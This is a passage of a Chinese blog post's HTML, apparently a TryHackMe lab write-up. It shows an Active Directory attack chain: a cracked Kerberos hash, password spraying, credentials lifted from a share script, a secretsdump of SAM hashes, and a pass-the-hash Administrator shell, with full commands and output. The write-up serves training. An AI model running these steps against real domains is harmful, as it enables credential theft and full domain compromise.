class="hljs-string">$krb5asrep$23$t-skid@VULNNET-RST:790abfdf61710280a020478ac648d95b$5b551dc44e7d4b1f93bc8cc4c2d9ee12f27338a288bc42ba2a5331e068398375d5a69d717d3a098a2793ce03911181e9a7fae0fee6d633d5706e2bad750eb617410af1e660e6272f1c5e0bbadf61c9fc03a6e5c35bb42bafb273d06959b9ca10e3d297da5336fb598eacb1e1967ec6f85318e00c89b72aca588ba03ccc908c986e31cb47e6e1c2014a6819a7a3664076743c2b7ec145582f632c02414b2c5d2f64dd7d91766ce57e295b02602194bf9f70ba5a4287222b0bc374b5751d25cffc4fe51dc6ef6fe209261534c91bc377668c7439b88851c09bc1ea6b5b3a2718cacccafa412b4ac562b3071e16051d345d:tj072889*</span><br></code></pre></td></tr></table></figure>
+
+<p>没有口令碰撞的可能：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$crackmapexec</span> smb 10.10.45.136 -u ./newusers.txt -p passwd --continue-on-success<br>SMB         10.10.45.136     445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)<br>SMB         10.10.45.136     445    WIN-2BO8M1OE1M1  [-] vulnnet-rst.local\Administrator:tj072889* STATUS_LOGON_FAILURE <br>SMB         10.10.45.136     445    WIN-2BO8M1OE1M1  [-] vulnnet-rst.local\Guest:tj072889* STATUS_LOGON_FAILURE <br>SMB         10.10.45.136     445    WIN-2BO8M1OE1M1  [-] vulnnet-rst.local\krbtgt:tj072889* STATUS_LOGON_FAILURE <br>SMB         10.10.45.136     445    WIN-2BO8M1OE1M1  [-] vulnnet-rst.local\WIN-2BO8M1OE1M1$:tj072889* STATUS_LOGON_FAILURE <br>SMB         10.10.45.136     445    WIN-2BO8M1OE1M1  [-] vulnnet-rst.local\enterprise-core-vn:tj072889* STATUS_LOGON_FAILURE <br>SMB         10.10.45.136     445    WIN-2BO8M1OE1M1  [-] vulnnet-rst.local\a-whitehat:tj072889* STATUS_LOGON_FAILURE <br>SMB         10.10.45.136     445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\t-skid:tj072889* <br>SMB         10.10.45.136     445    WIN-2BO8M1OE1M1  [-] vulnnet-rst.local\j-goldenhand:tj072889* STATUS_LOGON_FAILURE <br>SMB         10.10.45.136     445    WIN-2BO8M1OE1M1  [-] vulnnet-rst.local\j-leet:tj072889* STATUS_LOGON_FAILURE <br></code></pre></td></tr></table></figure>
+
+<p>那还是只能查看SMB共享：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$smbmap</span> -H 10.10.45.136 -u t-skid -p tj072889*<br>[+] IP: 10.10.45.136:445	Name: 10.10.45.136                                       <br>        Disk                                                  	Permissions	Comment<br>	----                                                  	-----------	-------<br>	ADMIN$                                            	NO ACCESS	Remote Admin<br>	C$                                                	NO ACCESS	Default share<br>	IPC$                                              	READ ONLY	Remote IPC<br>	NETLOGON                                          	READ ONLY	Logon server share <br>	SYSVOL                                            	READ ONLY	Logon server share <br>	VulnNet-Business-Anonymous                        	READ ONLY	VulnNet Business Sharing<br>	VulnNet-Enterprise-Anonymous                      	READ ONLY	VulnNet Enterprise Sharing<br>	<br><span class="hljs-variable">$smbclient</span> //10.10.45.136/NETLOGON -U vulnnet-rst.local/t-skid<br>Enter VULNNET-RST.LOCAL\t-skid<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; LS</span><br><span class="hljs-string">  .                                   D        0  Wed Mar 17 07:15:49 2021</span><br><span class="hljs-string">  ..                                  D        0  Wed Mar 17 07:15:49 2021</span><br><span class="hljs-string">  ResetPassword.vbs                   A     2821  Wed Mar 17 07:18:14 2021</span><br><span class="hljs-string"></span><br><span class="hljs-string">		8771839 blocks of size 4096. 4527255 blocks available</span><br><span class="hljs-string">smb: \&gt; get ResetPassword.vbs </span><br><span class="hljs-string"></span><br><span class="hljs-string">$cat ResetPassword.vbs </span><br><span class="hljs-string">Option Explicit</span><br><span class="hljs-string"></span><br><span class="hljs-string">Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain</span><br><span class="hljs-string">Dim strUserDN, objUser, strPassword, strUserNTName</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;</span> Constants <span class="hljs-keyword">for</span> the NameTranslate object.<br>Const ADS_NAME_INITTYPE_GC = 3<br>Const ADS_NAME_TYPE_NT4 = 3<br>Const ADS_NAME_TYPE_1779 = 1<br><br>If (Wscript.Arguments.Count &lt;&gt; 0) Then<br>    Wscript.Echo <span class="hljs-string">&quot;Syntax Error. Correct syntax is:&quot;</span><br>    Wscript.Echo <span class="hljs-string">&quot;cscript ResetPassword.vbs&quot;</span><br>    Wscript.Quit<br>End If<br><br>strUserNTName = <span class="hljs-string">&quot;a-whitehat&quot;</span><br>strPassword = <span class="hljs-string">&quot;bNdKVkjv3RR9ht&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$crackmapexec</span> smb 10.10.45.136 -u a-whitehat -p bNdKVkjv3RR9ht<br>SMB         10.10.45.136     445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)<br></code></pre></td></tr></table></figure>
+
+<p>可以尝试登录winrm：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$evil</span>-winrm -i 10.10.45.136 -u a-whitehat -p bNdKVkjv3RR9ht<br><br>Evil-WinRM shell v3.4<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\a-whitehat\Documents&gt; <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\enterprise-core-vn\desktop&gt; <span class="hljs-built_in">whoami</span> /all<br><br>USER INFORMATION<br>----------------<br><br>User Name              SID<br>====================== =============================================<br>vulnnet-rst\a-whitehat S-1-5-21-1589833671-435344116-4136949213-1105<br><br><br>GROUP INFORMATION<br>-----------------<br><br>Group Name                                         Type             SID                                          Attributes<br>================================================== ================ ============================================ ===============================================================<br>Everyone                                           Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group<br>BUILTIN\Users                                      Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group<br>BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group<br>BUILTIN\Administrators                             Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner<br>NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group<br>NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group<br>NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group<br>VULNNET-RST\Domain Admins                          Group            S-1-5-21-1589833671-435344116-4136949213-512 Mandatory group, Enabled by default, Enabled group<br>VULNNET-RST\Denied RODC Password Replication Group Alias            S-1-5-21-1589833671-435344116-4136949213-572 Mandatory group, Enabled by default, Enabled group, Local Group<br>NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group<br>Mandatory Label\High Mandatory Level               Label            S-1-16-12288<br><br><br>PRIVILEGES INFORMATION<br>----------------------<br><br>Privilege Name                            Description                                                        State<br>========================================= ================================================================== =======<br>SeIncreaseQuotaPrivilege                  Adjust memory quotas <span class="hljs-keyword">for</span> a process                                 Enabled<br>SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled<br>SeSecurityPrivilege                       Manage auditing and security <span class="hljs-built_in">log</span>                                   Enabled<br>SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled<br>SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled<br>SeSystemProfilePrivilege                  Profile system performance                                         Enabled<br>SeSystemtimePrivilege                     Change the system time                                             Enabled<br>SeProfileSingleProcessPrivilege           Profile single process                                             Enabled<br>SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled<br>SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled<br>SeBackupPrivilege                         Back up files and directories                                      Enabled<br>SeRestorePrivilege                        Restore files and directories                                      Enabled<br>SeShutdownPrivilege                       Shut down the system                                               Enabled<br>SeDebugPrivilege                          Debug programs                                                     Enabled<br>SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled<br>SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled<br>SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled<br>SeUndockPrivilege                         Remove computer from docking station                               Enabled<br>SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted <span class="hljs-keyword">for</span> delegation     Enabled<br>SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled<br>SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled<br>SeCreateGlobalPrivilege                   Create global objects                                              Enabled<br>SeIncreaseWorkingSetPrivilege             Increase a process working <span class="hljs-built_in">set</span>                                     Enabled<br>SeTimeZonePrivilege                       Change the time zone                                               Enabled<br>SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled<br>SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token <span class="hljs-keyword">for</span> another user <span class="hljs-keyword">in</span> the same session Enabled<br><br><br>USER CLAIMS INFORMATION<br>-----------------------<br><br>User claims unknown.<br><br>Kerberos support <span class="hljs-keyword">for</span> Dynamic Access Control on this device has been disabled.<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="渗出："><a href="#渗出：" class="headerlink" title="渗出："></a>渗出：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$secretsdump</span>.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.45.136<br>Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation<br><br>[*] Service RemoteRegistry is <span class="hljs-keyword">in</span> stopped state<br>[*] Starting service RemoteRegistry<br>[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a<br>[*] Dumping <span class="hljs-built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>[-] SAM hashes extraction <span class="hljs-keyword">for</span> user WDAGUtilityAccount failed. The account doesn<span class="hljs-string">&#x27;t have hash information.</span><br><span class="hljs-string">[*] Dumping cached domain logon information (domain/username:hash)</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$evil</span>-winrm -i 10.10.45.136 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d<br><br>Evil-WinRM shell v3.4<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/TryHackMe/" class="category-chain-item">TryHackMe</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Active-Directory/">#Active Directory</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>TryHackMe-VulnNet Roasted</div>
+      <div>http://example.com/2022/10/06/TryHackMe-VulnNet Roasted/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Mosaic Theory</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/TryHackMe-Juicy-Details/" title="TryHackMe-Juicy Details">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">TryHackMe-Juicy Details</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/Tryhackme-Alfred/" title="Tryhackme-Alfred">
+                        <span class="hidden-mobile">Tryhackme-Alfred</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
